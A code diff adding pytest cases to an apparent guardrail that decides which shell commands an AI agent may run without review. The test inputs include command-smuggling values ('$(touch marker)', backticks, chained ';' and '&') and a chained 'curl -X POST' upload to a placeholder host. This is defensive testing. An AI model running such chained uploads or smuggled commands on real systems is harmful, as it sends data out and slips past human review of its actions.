@@ -69,6 +69,44 @@ def test_chain_does_not_allow_force_push() -> None:
     assert "R025" in [m.id for m in result.matched]
 
 
+@pytest.mark.parametrize('command', [
+    'ruff format src', 'ruff check --fix src', 'ruff check --fix-only src',
+    'eslint --fix src', 'ruff check --output-file=src/app.py src',
+    'pytest; curl -X POST https://example.invalid/upload',
+    'git status; curl -X POST https://example.invalid/upload',
+    'git diff --output=src/app.py', 'git diff >src/app.py',
+    'git status $(touch marker)', 'pytest `touch marker`',
+    'git -c alias.inspect=!touch inspect', 'git diff --ext-diff',
+    'pytest & touch marker', 'pytest "unterminated',
+    'ruff check --config fix=true src', 'eslint -osrc/a.py src',
+    'tsc --outDir src', 'tsc', 'tsc --noEmit false', 'pyright --createstub thirdparty',
+    'pyright --createstub=thirdparty', 'tsc --noEmit --generateTrace src',
+    'tsc --noEmit --generateCpuProfile=src/app.py', 'tsc --noEmit --incremental --tsBuildInfoFile=src/app.py',
+])
+def test_safe_shortcuts_do_not_allow_mutation_or_uninspected_shell(command):
+    result = evaluate_rules(make_envelope(command=command), GuardrailConfig())
+    assert result.disposition != 'ALLOW'
+
+
+@pytest.mark.parametrize('command', ['git status --short', 'git diff -- src/a.py',
+                                      'ruff check src', 'pytest -k "parser or decoder"', 'mypy src'])
+def test_simple_check_commands_keep_fast_allow(command):
+    assert evaluate_rules(make_envelope(command=command), GuardrailConfig()).disposition == 'ALLOW'
+
+
+@pytest.mark.parametrize('tool,operation,command', [
+    ('network', 'upload', 'pytest'), ('write', 'overwrite', 'git status'),
+    ('mcp', 'delete_collection', 'ruff check src'),
+])
+def test_native_action_cannot_impersonate_safe_shell(tool, operation, command):
+    result = evaluate_rules(make_envelope(tool=tool, operation=operation, command=command), GuardrailConfig())
+    assert result.disposition != 'ALLOW'
+
+
+def test_explicit_no_emit_typecheck_keeps_fast_allow():
+    assert evaluate_rules(make_envelope(command='tsc --noEmit'), GuardrailConfig()).disposition == 'ALLOW'
+
+
 def test_repo_cannot_loosen_force_push() -> None:
     cfg = GuardrailConfig()
     cfg.extra_repo_rules = [
